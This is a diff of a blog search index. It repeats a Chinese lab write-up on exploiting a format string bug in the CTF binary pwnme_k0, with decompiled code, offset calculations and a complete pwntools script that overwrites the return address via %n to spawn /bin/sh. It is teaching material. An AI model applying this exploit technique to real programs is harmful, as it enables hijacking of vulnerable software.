class="line">  v14 = read(<span class="number">0</span>, &amp;src, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &amp;&amp; v14 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    sub_400AE5(&amp;src, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, &amp;src, v14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:10)!try again.."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><code>sub_400D1A</code>（选择 3）输出了退出信息</li>
+<li><code>sub_400B07</code>（选择 1）输出了用户的信息  <figure class="highlight c"><figcaption><span>sub_400b07</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line marked"><span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line marked"><span class="keyword">return</span> <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>显然此处存在格式化字符串漏洞，在输出用户名和密码时都使用了 <code>printf(buf)</code> 的格式。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>确定保护</p>
+ <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file pwnme_k0</span><br></pre></td></tr></tbody></table></figure>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/5.png" class="">
+<ul>
+<li>本题开启了 RELRO 保护，将不能对 GOT 表进行写操作，但可以通过覆写返回地址获取 shell。采用的思路是：先泄露出返回地址字段的位置，然后利用 <code>%n</code> 实现覆写。</li>
+</ul>
+</li>
+<li>
+<p>开始利用</p>
+<ul>
+<li>
+<p>在 <code>4008a6</code> 处找到了 <code>/bin/sh</code> 字符串，结合下方的 call system，这里实现了一个完整的 <code>system('/bin/sh')</code>，因此只要把返回地址写成这个地址就可以了。</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/6.png" class="">
+</li>
+<li>
+<p>那么，返回地址在哪里呢？就从那个有漏洞的 <code>sub_400b07</code> 下手。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>在 <code>0x400b28</code> 的 <code>printf</code> 上下断点</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/7.png" class=""> <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/8.png" class="">
+ <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/10.png" class=""></div></div></div>
+</li>
+<li>
+<p><code>call 0x400770</code> 应该是 <code>printf</code> 的地址，stack 中，栈顶是 rbp，第二个是返回地址 <code>0x400d74</code>，第三个是代表用户名的字符串 <code>aaa</code>，<code>printf</code> 的参数。又因为 64 位系统中，函数前六个参数分别放在寄存器 RDI，RSI，RDX，RCX，R8 和 R9 上，除了存放格式化字符串的 rdi 参数，栈顶元素应该在第 5+1=6 个位置上（越过 R9）。从 rbp 的输出可以计算出返回地址偏移为 0x7fffffffddc0-0x7fffffffdd80+8 (64 位系统的一个存储块为 8 个字节)=0x48。设置 <code>username</code> 为 <code>%6$p</code> 即可获取栈顶元素内容，减掉偏移 <code>0x48</code> 得到返回地址在栈中位置</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/11.png" class="">
+</li>
+<li>
+<p>下一步修改，需要利用 <code>edit</code> 函数将 <code>username</code> 修改为返回地址在栈中的地址，<code>password</code> 修改为用于攻击的格式化字符串。<code>username</code> 是格式化字符串的第 8 个参数，通过 <code>%8$hn</code> 向第 8 个参数所指向的位置中写入 <code>0x08a6</code>(十进制为 <code>2214</code>) 两个字节实现对返回地址的覆写</p>
+</li>
+<li>
+<p>最终利用 payload 如下所示，为方便理解，对于一些操作做了封装。</p>
+<figure class="highlight python"><figcaption><span>payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   context.log_level=<span class="string">'debug'</span></span><br><span class="line">   p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">debugs=(<span class="params"><span class="literal">True</span>,<span class="literal">True</span></span>)</span>):</span><br><span class="line">    <span class="comment"># return-addr:0x400d74 -&gt; system:0x4008a6</span></span><br><span class="line">	<span class="comment"># libc = ELF('libc.so')</span></span><br><span class="line">	debug1,debug2=debugs</span><br><span class="line">	register(<span class="string">"%6$p"</span>,<span class="string">"bbb"</span>)</span><br><span class="line">	offset = <span class="number">0x7fffffffddc0</span> - <span class="number">0x7fffffffdd80</span> + <span class="number">8</span></span><br><span class="line">	show()</span><br><span class="line">	stack_top = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">	return_addr = stack_top-offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]stack top:0x%x"</span>%stack_top</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]offset:0x%x"</span>%offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]return_addr in stack:0x%x"</span>%return_addr</span><br><span class="line">	<span class="keyword">if</span> debug1:</span><br><span class="line">		gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		quit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		edit(username=p64(return_addr),password=<span class="string">"%2214c%8$hn"</span>)</span><br><span class="line">		<span class="comment"># 2114 is the decimal value of 0x08a6</span></span><br><span class="line">		<span class="keyword">if</span> debug2:</span><br><span class="line">			gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			show()</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve(debugs=(<span class="literal">False</span>,<span class="literal">False</span>))</span><br><span class="line">   </span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%881.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%882.png" class=""></div></div></div>
+<h2 id="实验难点与收获">实验难点与收获</h2>
+<p>本次实验的难点在于漏洞的利用，如何构造出 “致命” 的格式化字符串是最难的地方。格式化字符串漏洞的利用点不难分析，它利用了 <code>printf</code> 的格式化字符与参数数量不匹配的毛病，泄露内存地址，从而计算出一些信息。类似于 <code>printf(buf)</code> 的形式很容易输出程序地址信息，更可能引起内存覆写。</p>
+<p><code>%n</code> 是格式化字符串漏洞的关键，它完成了将所输入的内容直接写入内存地址空间的操作。基本上可以说是 pwn 中 getshell 前的最后一步。</p>
+<p>在写漏洞利用脚本时需要注意各种小问题，比如不可直接书写地址，地址的大小端，数据的进制，<code>recv</code> 和 <code>recvline</code> 的区别等。经过几轮调试后，终于写成了可以用的脚本。</p>
+<h2 id="实验思考">实验思考</h2>
+<p>上述脚本中，“向第 8 个参数所指向的位置写东西” 使用的格式化字符为 <code>%8$hn</code>，而课件上和课上讲的是 <code>$hhn</code>，这两个有什么区别？</p>
+<blockquote><p><code>%$hn</code> 表示写入的地址空间为 2 字节，<code>%$hhn</code> 表示写入的地址空间为 1 字节，<code>%$lln</code> 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时，直接写 4 字节 <code>%n</code> 会导致程序崩溃或等候时间过长，可以通过 <code>%$hn</code> 或 <code>%$hhn</code> 来适时调整。</p>
+<footer><strong>Yable 的格式化字符串利用小结 </strong><cite><a href="https://www.cnblogs.com/Yable/p/7895732.html">www.cnblogs.com/Yable/p/7895732.html</a></cite></footer></blockquote>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>漏洞</category>
+        <category>漏洞分析</category>
+        <category>格式化字符串</category>
       </categories>
       <tags>
         <tag>网络空间安全</tag>
@@ -5509,109 +5605,13 @@ ARP 协议没有认证机制，只要接收到的协议包是有效的，主机�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>网络安全</category>
         <category>漏洞</category>
+        <category>网络安全</category>
         <category>协议漏洞</category>
       </categories>
       <tags>
         <tag>网络空间安全</tag>
         <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>格式化字符串漏洞</title>
-    <url>/2019/11/14/experiments/security/vulnerability_analysis/string-format/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用。</p>
-<span id="more"></span>
-<h2 id="步骤">步骤</h2>
-<ol>
-<li>
-<p>运行程序，大概走一遍流程 </p><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/2.png" class=""></div></div></div><p></p>
-</li>
-<li>
-<p>首先，程序接受最大 20 字节长的 “用户名” 和 “密码” 传入，注册成功后，会有三个选项：查看信息，修改信息和退出。</p>
-</li>
-<li>
-<p>用 ida 打开程序，搜索相关标志，发现程序首先调用了 <code>sub_4008BB()</code>，它输出了我们看到的 <code>banner</code>，并冲洗了标准输出（通过调用 <code>fflush(stdout)</code>）。 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/3.png" class=""></p>
-</li>
-<li>
-<p>从 <code>sub4008bb</code> 跟回到 <code>main</code> 函数，发现接下来是一个 “注册” 过程，由 <code>sub_400903</code> 函数负责。</p>
- <figure class="highlight c"><figcaption><span>sub_400903</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Register Account first!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v12 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v12 &amp;&amp; v12 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;a9 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  LOBYTE(bufa) = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"error length(username)!try again"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> buf;</span><br></pre></td></tr></tbody></table></figure>
-<p>使用 <code>read</code> 函数只将 20 字节数据读入，除此以外，所有的 <code>puts</code> 和 <code>read</code> 后都跟着一个 <code>fflush</code>，强行冲洗缓冲区。看来，缓冲区的毛病应该利用不上了。</p>
-</li>
-<li>
-<p>接下来是 <code>sub_400d2b</code> 函数，这是程序的后半部分 —— 选择输出、修改信息或退出程序。</p>
- <figure class="highlight c"><figcaption><span>sub_400d2b</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = sub_400A75();</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400B41((__int64)&amp;sa, <span class="number">0LL</span>, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D1A(v7, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_400B07((<span class="type">char</span>)v7, <span class="number">0</span>, v9, v10, v11, v12);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error options"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v7 = <span class="built_in">stdout</span>;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>其中 <code>sub_400a75</code> 输出了三个选项的内容  <figure class="highlight c"><figcaption><span>sub_400a75</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Sh0w Account Infomation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Ed1t Account Inf0mation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.QUit sangebaimao:("</span>);</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><code>sub_400b41</code>（选择 2）修改已注册用户名的信息  <figure class="highlight c"><figcaption><span>sub_400b41</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v15 &lt;= <span class="number">0</span> || v15 &gt; <span class="number">20</span> )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)s = sa;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;sa, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v14 = read(<span class="number">0</span>, &amp;src, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &amp;&amp; v14 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    sub_400AE5(&amp;src, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, &amp;src, v14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:10)!try again.."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li><code>sub_400D1A</code>（选择 3）输出了退出信息</li>
-<li><code>sub_400B07</code>（选择 1）输出了用户的信息  <figure class="highlight c"><figcaption><span>sub_400b07</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line marked"><span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line marked"><span class="keyword">return</span> <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>显然此处存在格式化字符串漏洞，在输出用户名和密码时都使用了 <code>printf(buf)</code> 的格式。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>
-<p>确定保护</p>
- <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file pwnme_k0</span><br></pre></td></tr></tbody></table></figure>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/5.png" class="">
-<ul>
-<li>本题开启了 RELRO 保护，将不能对 GOT 表进行写操作，但可以通过覆写返回地址获取 shell。采用的思路是：先泄露出返回地址字段的位置，然后利用 <code>%n</code> 实现覆写。</li>
-</ul>
-</li>
-<li>
-<p>开始利用</p>
-<ul>
-<li>
-<p>在 <code>4008a6</code> 处找到了 <code>/bin/sh</code> 字符串，结合下方的 call system，这里实现了一个完整的 <code>system('/bin/sh')</code>，因此只要把返回地址写成这个地址就可以了。</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/6.png" class="">
-</li>
-<li>
-<p>那么，返回地址在哪里呢？就从那个有漏洞的 <code>sub_400b07</code> 下手。</p>
-</li>
-</ul>
-</li>
-<li>
-<p>在 <code>0x400b28</code> 的 <code>printf</code> 上下断点</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/7.png" class=""> <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/8.png" class="">
- <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/10.png" class=""></div></div></div>
-</li>
-<li>
-<p><code>call 0x400770</code> 应该是 <code>printf</code> 的地址，stack 中，栈顶是 rbp，第二个是返回地址 <code>0x400d74</code>，第三个是代表用户名的字符串 <code>aaa</code>，<code>printf</code> 的参数。又因为 64 位系统中，函数前六个参数分别放在寄存器 RDI，RSI，RDX，RCX，R8 和 R9 上，除了存放格式化字符串的 rdi 参数，栈顶元素应该在第 5+1=6 个位置上（越过 R9）。从 rbp 的输出可以计算出返回地址偏移为 0x7fffffffddc0-0x7fffffffdd80+8 (64 位系统的一个存储块为 8 个字节)=0x48。设置 <code>username</code> 为 <code>%6$p</code> 即可获取栈顶元素内容，减掉偏移 <code>0x48</code> 得到返回地址在栈中位置</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/11.png" class="">
-</li>
-<li>
-<p>下一步修改，需要利用 <code>edit</code> 函数将 <code>username</code> 修改为返回地址在栈中的地址，<code>password</code> 修改为用于攻击的格式化字符串。<code>username</code> 是格式化字符串的第 8 个参数，通过 <code>%8$hn</code> 向第 8 个参数所指向的位置中写入 <code>0x08a6</code>(十进制为 <code>2214</code>) 两个字节实现对返回地址的覆写</p>
-</li>
-<li>
-<p>最终利用 payload 如下所示，为方便理解，对于一些操作做了封装。</p>
-<figure class="highlight python"><figcaption><span>payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   context.log_level=<span class="string">'debug'</span></span><br><span class="line">   p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">debugs=(<span class="params"><span class="literal">True</span>,<span class="literal">True</span></span>)</span>):</span><br><span class="line">    <span class="comment"># return-addr:0x400d74 -&gt; system:0x4008a6</span></span><br><span class="line">	<span class="comment"># libc = ELF('libc.so')</span></span><br><span class="line">	debug1,debug2=debugs</span><br><span class="line">	register(<span class="string">"%6$p"</span>,<span class="string">"bbb"</span>)</span><br><span class="line">	offset = <span class="number">0x7fffffffddc0</span> - <span class="number">0x7fffffffdd80</span> + <span class="number">8</span></span><br><span class="line">	show()</span><br><span class="line">	stack_top = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">	return_addr = stack_top-offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]stack top:0x%x"</span>%stack_top</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]offset:0x%x"</span>%offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]return_addr in stack:0x%x"</span>%return_addr</span><br><span class="line">	<span class="keyword">if</span> debug1:</span><br><span class="line">		gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		quit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		edit(username=p64(return_addr),password=<span class="string">"%2214c%8$hn"</span>)</span><br><span class="line">		<span class="comment"># 2114 is the decimal value of 0x08a6</span></span><br><span class="line">		<span class="keyword">if</span> debug2:</span><br><span class="line">			gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			show()</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve(debugs=(<span class="literal">False</span>,<span class="literal">False</span>))</span><br><span class="line">   </span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ol>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%881.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%882.png" class=""></div></div></div>
-<h2 id="实验难点与收获">实验难点与收获</h2>
-<p>本次实验的难点在于漏洞的利用，如何构造出 “致命” 的格式化字符串是最难的地方。格式化字符串漏洞的利用点不难分析，它利用了 <code>printf</code> 的格式化字符与参数数量不匹配的毛病，泄露内存地址，从而计算出一些信息。类似于 <code>printf(buf)</code> 的形式很容易输出程序地址信息，更可能引起内存覆写。</p>
-<p><code>%n</code> 是格式化字符串漏洞的关键，它完成了将所输入的内容直接写入内存地址空间的操作。基本上可以说是 pwn 中 getshell 前的最后一步。</p>
-<p>在写漏洞利用脚本时需要注意各种小问题，比如不可直接书写地址，地址的大小端，数据的进制，<code>recv</code> 和 <code>recvline</code> 的区别等。经过几轮调试后，终于写成了可以用的脚本。</p>
-<h2 id="实验思考">实验思考</h2>
-<p>上述脚本中，“向第 8 个参数所指向的位置写东西” 使用的格式化字符为 <code>%8$hn</code>，而课件上和课上讲的是 <code>$hhn</code>，这两个有什么区别？</p>
-<blockquote><p><code>%$hn</code> 表示写入的地址空间为 2 字节，<code>%$hhn</code> 表示写入的地址空间为 1 字节，<code>%$lln</code> 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时，直接写 4 字节 <code>%n</code> 会导致程序崩溃或等候时间过长，可以通过 <code>%$hn</code> 或 <code>%$hhn</code> 来适时调整。</p>
-<footer><strong>Yable 的格式化字符串利用小结 </strong><cite><a href="https://www.cnblogs.com/Yable/p/7895732.html">www.cnblogs.com/Yable/p/7895732.html</a></cite></footer></blockquote>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>漏洞分析</category>
-        <category>漏洞</category>
-        <category>格式化字符串</category>
